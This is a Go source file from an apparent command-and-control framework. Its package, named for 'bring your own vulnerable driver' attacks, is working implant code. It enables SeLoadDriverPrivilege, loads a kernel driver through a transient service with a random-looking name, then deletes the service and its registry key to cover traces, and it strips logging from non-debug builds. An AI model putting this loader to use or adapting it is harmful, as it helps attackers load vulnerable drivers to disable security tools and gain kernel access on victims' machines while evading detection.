package byovd

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// Driver loading/unloading via the Windows Service Control Manager.
//
// Kernel drivers require a service of type SERVICE_KERNEL_DRIVER. We create
// a transient service, start it, and delete the service entry on cleanup.
// The driver file itself is deleted separately by the caller after unloading.
//
// Caller must be running as SYSTEM or Administrator with
// SeLoadDriverPrivilege enabled. The privilege is acquired by
// AcquireLoadDriverPrivilege before any load attempt.

import (
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	serviceType      = uint32(0x00000001) // SERVICE_KERNEL_DRIVER
	serviceStartType = uint32(0x00000003) // SERVICE_DEMAND_START
	serviceError     = uint32(0x00000000) // SERVICE_ERROR_IGNORE
)

// loadDriver creates a transient SCM service for the driver at driverPath
// and starts it. serviceName should be a short random-looking string.
// Returns the service handle (caller must close) and any error.
func loadDriver(serviceName, driverPath string) (windows.Handle, error) {
	if err := acquireLoadDriverPrivilege(); err != nil {
		// {{if .Config.Debug}}
		log.Printf("[byovd] privilege acquire failed: %v", err)
		// {{end}}
		return 0, fmt.Errorf("SeLoadDriverPrivilege: %w", err)
	}

	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CREATE_SERVICE)
	if err != nil {
		return 0, fmt.Errorf("OpenSCManager: %w", err)
	}
	defer windows.CloseServiceHandle(scm)

	namePtr, _ := windows.UTF16PtrFromString(serviceName)
	pathPtr, _ := windows.UTF16PtrFromString(driverPath)

	svc, err := windows.CreateService(
		scm,
		namePtr,
		namePtr,
		windows.SERVICE_ALL_ACCESS,
		serviceType,
		serviceStartType,
		serviceError,
		pathPtr,
		nil, nil, nil, nil, nil,
	)
	if err != nil {
		// Service might already exist from a previous run — try to open it.
		svc, err = windows.OpenService(scm, namePtr, windows.SERVICE_ALL_ACCESS)
		if err != nil {
			return 0, fmt.Errorf("CreateService/OpenService: %w", err)
		}
	}

	if err := windows.StartService(svc, 0, nil); err != nil {
		// ERROR_SERVICE_ALREADY_RUNNING (1056) is fine.
		if !isAlreadyRunning(err) {
			windows.DeleteService(svc)
			windows.CloseServiceHandle(svc)
			return 0, fmt.Errorf("StartService: %w", err)
		}
	}

	// {{if .Config.Debug}}
	log.Printf("[byovd] driver service '%s' started", serviceName)
	// {{end}}
	return svc, nil
}

// unloadDriver stops and deletes the service identified by svcHandle, then
// removes its registry entry. It does not delete the driver file on disk.
func unloadDriver(svcHandle windows.Handle, serviceName string) {
	var ss windows.SERVICE_STATUS
	_ = windows.ControlService(svcHandle, windows.SERVICE_CONTROL_STOP, &ss)
	_ = windows.DeleteService(svcHandle)
	windows.CloseServiceHandle(svcHandle)

	// Belt-and-suspenders: also nuke the registry key that SCM leaves behind.
	regPath := `SYSTEM\CurrentControlSet\Services\` + serviceName
	_ = registry.DeleteKey(registry.LOCAL_MACHINE, regPath)

	// {{if .Config.Debug}}
	log.Printf("[byovd] driver service '%s' unloaded", serviceName)
	// {{end}}
}

// acquireLoadDriverPrivilege enables SeLoadDriverPrivilege on the current
// token. Required to call NtLoadDriver / create a kernel-driver service.
func acquireLoadDriverPrivilege() error {
	var token windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token); err != nil {
		return err
	}
	defer token.Close()

	const seLoadDriverPrivilege = "SeLoadDriverPrivilege"
	var luid windows.LUID
	if err := windows.LookupPrivilegeValue(nil,
		windows.StringToUTF16Ptr(seLoadDriverPrivilege), &luid); err != nil {
		return err
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}
	return windows.AdjustTokenPrivileges(token, false, &tp,
		uint32(unsafe.Sizeof(tp)), nil, nil)
}

func isAlreadyRunning(err error) bool {
	if e, ok := err.(windows.Errno); ok {
		return e == 1056 // ERROR_SERVICE_ALREADY_RUNNING
	}
	return false
}
